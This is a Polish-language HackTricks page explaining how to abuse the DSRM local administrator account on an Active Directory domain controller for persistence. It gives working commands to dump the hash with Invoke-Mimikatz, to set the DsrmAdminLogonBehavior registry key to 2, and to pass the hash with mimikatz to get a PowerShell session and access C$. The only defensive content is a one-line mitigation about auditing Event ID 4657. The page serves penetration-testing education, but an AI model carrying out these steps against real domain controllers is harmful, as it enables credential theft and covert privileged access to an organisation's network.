{{#include ../../banners/hacktricks-training.md}}

# DSRM Credentials

W każdym **DC** znajduje się konto **lokalnego administratora**. Posiadając uprawnienia administratora na tej maszynie, możesz użyć mimikatz do **zrzutu hasha lokalnego administratora**. Następnie, modyfikując rejestr, aby **aktywować to hasło**, możesz zdalnie uzyskać dostęp do tego lokalnego użytkownika administratora.\
Najpierw musimy **zrzucić** **hash** użytkownika **lokalnego administratora** w DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Następnie musimy sprawdzić, czy to konto będzie działać, a jeśli klucz rejestru ma wartość "0" lub nie istnieje, musisz **ustawić go na "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Następnie, używając PTH, możesz **wylistować zawartość C$ lub nawet uzyskać powłokę**. Zauważ, że do utworzenia nowej sesji powershell z tym hashem w pamięci (dla PTH) **"domeną" używaną jest po prostu nazwa maszyny DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Więcej informacji na ten temat w: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) i [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Łagodzenie

- Event ID 4657 - Audyt utworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
